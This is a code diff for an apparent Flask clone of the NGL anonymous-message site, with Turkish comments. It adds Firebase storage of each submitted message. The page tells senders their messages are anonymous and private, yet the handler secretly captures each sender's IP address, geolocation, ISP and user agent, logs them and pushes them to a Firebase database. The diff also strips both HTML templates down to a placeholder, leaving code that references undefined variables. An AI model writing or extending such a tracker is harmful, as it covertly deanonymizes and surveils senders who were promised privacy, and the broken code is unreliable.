@@ -2,30 +2,24 @@ from flask import Flask, request, render_template_string, redirect
 import logging
 import requests
 import os
-import firebase_admin
-from firebase_admin import credentials, db
 from datetime import datetime
 
-# Firebase'i başlat (app = Flask(__name__) satırından hemen sonra koy)
-cred = credentials.Certificate("serviceAccountKey.json")  # ← bu dosyayı aşağıda anlatacağım
-firebase_admin.initialize_app(cred, {
-    'databaseURL': 'https://SENIN-PROJE-ID.firebaseio.com/'  # ← senin realtime db url'n
-})
+# Firebase Admin SDK import'ları (en üstte olmalı)
+import firebase_admin
+from firebase_admin import credentials, db
 
-# POST bloğunda, if msg: kısmının içine ekle (logging.info'dan sonra)
-message_data = {
-    "username": username,
-    "message": msg,
-    "ip": client_ip,
-    "location": location,
-    "isp": isp,
-    "user_agent": user_agent[:150],
-    "timestamp": datetime.now().strftime("%d.%m.%Y %H:%M:%S")
-}
+# Firebase'i başlat (kodun en başında, app'ten önce)
+try:
+    cred = credentials.Certificate("serviceAccountKey.json")  # dosya proje kökünde olmalı
+    firebase_admin.initialize_app(cred, {
+        'databaseURL': 'https://itiraf-a5d24-default-rtdb.firebaseio.com/'  # ← BURAYI DEĞİŞTİR (kendi realtime db url'n)
+    })
+    print("Firebase başarıyla başlatıldı")
+except Exception as e:
+    print(f"Firebase başlatma hatası: {str(e)}")  # hata olursa konsolda gör
+    # İstersen burada logging.warning ekleyebilirsin
 
-ref = db.reference('/messages')
-ref.push(message_data)  # otomatik unique key ile ekler
-# Logging ayarları – Render için hem dosya hem konsol
+# Logging ayarları
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s | %(levelname)s | %(message)s',
@@ -37,182 +31,19 @@ logging.basicConfig(
 
 app = Flask(__name__)
 
-# Ana sayfa HTML – kullanıcı adı girme kutusu + açıklama
-HOME_HTML = """
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NGL - Anonim Mesaj</title>
-    <style>
-        body {
-            background: linear-gradient(135deg, #000000, #1a0033);
-            color: white;
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 20px;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        h1 {
-            font-size: 4rem;
-            font-weight: 800;
-            margin-bottom: 20px;
-            background: linear-gradient(90deg, #ff00cc, #3333ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        input[type="text"] {
-            width: 80%;
-            max-width: 400px;
-            padding: 15px;
-            font-size: 1.2rem;
-            border: none;
-            border-radius: 50px;
-            background: rgba(255,255,255,0.1);
-            color: white;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        input[type="text"]::placeholder { color: rgba(255,255,255,0.6); }
-        button {
-            padding: 16px 50px;
-            background: linear-gradient(90deg, #ff00cc, #3333ff);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 1.3rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        button:hover { transform: scale(1.05); }
-        .info {
-            margin-top: 30px;
-            font-size: 0.9rem;
-            opacity: 0.7;
-            color: #ccc;
-        }
-    </style>
-</head>
-<body>
-    <h1>NGL Anonim</h1>
-    <p>Kullanıcı adını gir (isteğe bağlı)</p>
-    <form method="GET" action="/">
-        <input type="text" name="username" placeholder="Kullanıcı adı gir (örn: muhammedemin)" autocomplete="off">
-        <button type="submit">Devam Et</button>
-    </form>
-    <div class="info">Boş bırakırsan rastgele bir isim kullanılır</div>
-</body>
-</html>
-"""
+# HOME_HTML ve NGL_HTML aynı kalıyor (seninkini kopyala, değişiklik yok)
 
-# NGL mesaj gönderme sayfası (önceki tasarımın aynısı)
-NGL_HTML = """
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NGL</title>
-    <style>
-        body {
-            background: linear-gradient(135deg, #000000, #1a0033);
-            color: white;
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 20px;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        h1 {
-            font-size: 4rem;
-            font-weight: 800;
-            margin-bottom: 10px;
-            background: linear-gradient(90deg, #ff00cc, #3333ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        p { font-size: 1.3rem; opacity: 0.8; margin-bottom: 40px; }
-        textarea {
-            width: 80%;
-            max-width: 500px;
-            height: 120px;
-            background: rgba(255,255,255,0.1);
-            border: none;
-            border-radius: 16px;
-            padding: 20px;
-            color: white;
-            font-size: 1.2rem;
-            resize: none;
-            outline: none;
-            backdrop-filter: blur(10px);
-        }
-        textarea::placeholder { color: rgba(255,255,255,0.6); }
-        button {
-            margin-top: 30px;
-            padding: 16px 40px;
-            background: linear-gradient(90deg, #ff00cc, #3333ff);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 1.3rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        button:hover { transform: scale(1.05); }
-        .success {
-            font-size: 2rem;
-            margin-top: 50px;
-            animation: fadeIn 1s;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-    </style>
-</head>
-<body>
-    {% if success %}
-        <div class="success">✅ Mesajın gönderildi!</div>
-        <p>gizlilik esastır.</p>
-    {% else %}
-        <h1>@{{ username }}</h1>
-        <p>Anonim mesaj gönder</p>
-        <form method="POST">
-            <textarea name="message" placeholder="Buraya yaz..." required></textarea><br>
-            <button type="submit">Gönder</button>
-        </form>
-    {% endif %}
-</body>
-</html>
-"""
+# ... (HOME_HTML ve NGL_HTML string'lerini buraya yapıştır, uzun diye atladım)
 
 @app.route('/', methods=['GET', 'POST'])
 def home():
-    # GET isteğiyle kullanıcı adı geliyorsa
     username = request.args.get('username', '').strip()
-
     if username:
-        # Kullanıcı adı girilmişse mesaj sayfasına yönlendir
         return redirect(f"/{username}")
-
-    # Kullanıcı adı girilmemişse giriş ekranı göster
     return render_template_string(HOME_HTML)
 
 @app.route('/<username>', methods=['GET', 'POST'])
 def ngl_page(username):
-    # IP alma
     client_ip = None
     if 'CF-Connecting-IP' in request.headers:
         client_ip = request.headers['CF-Connecting-IP'].strip()
@@ -227,7 +58,6 @@ def ngl_page(username):
 
     user_agent = request.headers.get('User-Agent', 'Bilinmiyor')[:200]
 
-    # Konum + ISP
     location = "Konum alınamadı"
     isp = "Bilinmiyor"
     if client_ip not in ['127.0.0.1', '::1']:
@@ -248,6 +78,25 @@ def ngl_page(username):
             log_entry = f"@{username} | MESAJ: {msg} | IP: {client_ip} | KONUM: {location} | ISP: {isp} | UA: {user_agent}"
             logging.info(log_entry)
             print(f"[YENİ MESAJ] {log_entry}")
+
+            # Firebase'e push et
+            try:
+                message_data = {
+                    "username": username,
+                    "message": msg,
+                    "ip": client_ip,
+                    "location": location,
+                    "isp": isp,
+                    "user_agent": user_agent[:150],
+                    "timestamp": datetime.now().strftime("%d.%m.%Y %H:%M:%S")
+                }
+                ref = db.reference('/messages')
+                ref.push(message_data)
+                print("[FIREBASE] Mesaj başarıyla kaydedildi")
+            except Exception as e:
+                print(f"[FIREBASE HATASI] {str(e)}")
+                logging.error(f"Firebase push hatası: {str(e)}")
+
         return render_template_string(NGL_HTML, username=username, success=True)
 
     return render_template_string(NGL_HTML, username=username, success=False)
